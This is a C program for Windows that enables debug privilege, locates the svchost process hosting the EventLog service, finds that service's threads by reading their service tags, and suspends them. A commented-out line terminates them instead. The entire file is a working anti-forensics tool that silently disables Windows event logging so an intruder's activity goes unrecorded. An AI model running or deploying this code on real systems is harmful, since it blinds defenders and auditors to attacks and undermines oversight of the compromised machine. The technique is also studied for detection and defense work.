#include <windows.h>  
#include <Strsafe.h>
#include <tlhelp32.h>  
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"shell32.lib")

#define ENABLE 1
#define DISABLE 0

typedef enum _SC_SERVICE_TAG_QUERY_TYPE {
	ServiceNameFromTagInformation = 1,
	ServiceNameReferencingModuleInformation,
	ServiceNameTagMappingInformation,
} SC_SERVICE_TAG_QUERY_TYPE, *PSC_SERVICE_TAG_QUERY_TYPE;

typedef struct _SC_SERVICE_TAG_QUERY {
	ULONG   processId;
	ULONG   serviceTag;
	ULONG   reserved;
	PVOID   pBuffer;
} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;

typedef struct _CLIENT_ID {
	DWORD       uniqueProcess;
	DWORD       uniqueThread;

} CLIENT_ID, *PCLIENT_ID;

typedef struct _THREAD_BASIC_INFORMATION {
	NTSTATUS    exitStatus;
	PVOID       pTebBaseAddress;
	CLIENT_ID   clientId;
	KAFFINITY   AffinityMask;
	int			Priority;
	int			BasePriority;
	int			v;

} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

typedef ULONG (WINAPI * I_QueryTagInformation_t)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
typedef NTSTATUS (WINAPI * NtQueryInformationThread_t)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);


BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("OpenProcessToken() failed!\n");
		return FALSE;
	}

    if ( !LookupPrivilegeValue( 
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if ( !AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { 
          printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
          return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
          printf("The token does not have the specified privilege.\n");
          return FALSE;
    } 

    return TRUE;
}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(int argc, char ** argv)
{
	SERVICE_STATUS_PROCESS svcStatus = {};
	DWORD bytesNeeded = 0;
	HANDLE hSvcProc = NULL;
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	THREAD_BASIC_INFORMATION threadBasicInfo;
	PVOID subProcessTag = NULL;
	BOOL bIsWoW64 = FALSE;
	DWORD dwOffset = NULL;
	
	
	// get function pointers
	NtQueryInformationThread_t pNtQueryInformationThread = (NtQueryInformationThread_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationThread");
	I_QueryTagInformation_t pI_QueryTagInformation = (I_QueryTagInformation_t) GetProcAddress(GetModuleHandle("advapi32.dll"), "I_QueryTagInformation");
	
	if (!SetPrivilege(SE_DEBUG_NAME, ENABLE)) {
		printf("Boooo! No powers, we die!\n");
		return -1;
	}
	
	// talk to Service Manager to find Eventlog process
	SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE svc = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

	//Get PID of svchost.exe that hosts EventLog service
	QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE) &svcStatus, sizeof(svcStatus), &bytesNeeded);
	DWORD svcPID = svcStatus.dwProcessId;
	
	printf("svchost with eventlog - PID: %d\n", svcPID);

	// open svchost.exe containing Eventlog
	hSvcProc = OpenProcess(PROCESS_VM_READ, FALSE, svcPID);
	if (hSvcProc == NULL)
		return -1;

	// get snapshot of all threads
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return -1;
	te32.dwSize = sizeof(THREADENTRY32);
	
	// parse the snapshot and search for threads belonging to eventlog
	if (!Thread32First(hThreadSnap, &te32)) {
		printf("Thread32First() and we died\n");
		CloseHandle(hThreadSnap);
		return -1;
	}
	
	do {
		// found the one from svchost.exe containing Eventlog
		if (te32.th32OwnerProcessID == svcPID) {
			
			// now searching for subProcessTag assigned to Eventlog
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			
			if (hThread == NULL) {
				printf("OpenThread : %u Error! ErrorCode:%u\n", te32.th32ThreadID, GetLastError());
				return 0;
			}
			NTSTATUS status = pNtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS) 0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);
			
			// check if svchost.exe is 32- or 64-bit, offset in TEB is different for each arch
			bIsWoW64 = IsWow64Process(hSvcProc, &bIsWoW64);
			if (!bIsWoW64)
				dwOffset = 0x1720;
			else
				dwOffset = 0xf60;
			
			// read subProcessTag value from TEB of svchost.exe
			ReadProcessMemory(hSvcProc, ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL);

			if (!subProcessTag) {
				CloseHandle(hThread);
				continue;
			}

			SC_SERVICE_TAG_QUERY query = { 0 };
			
			if (pI_QueryTagInformation)	{
				query.processId = (ULONG) svcPID;
				query.serviceTag = (ULONG) subProcessTag;
				query.reserved = 0;
				query.pBuffer = NULL;
				
				pI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);
				
				if (_wcsicmp((wchar_t *) query.pBuffer, L"eventlog") == 0) {
					printf("[!] Eventlog thread FOUND: %d. Suspending...", te32.th32ThreadID);
					if (SuspendThread(hThread) != -1)
					//printf("[!] Eventlog thread FOUND: %d. Killing...", te32.th32ThreadID);
					//if (TerminateThread(hThread, NULL))
						printf("done!\n");
					else
						printf("failed!\n");
				}
			}
			CloseHandle(hThread);
		}
	} while (Thread32Next(hThreadSnap, &te32));

	CloseHandle(hThreadSnap);
	CloseHandle(hSvcProc);

    return 0;
}
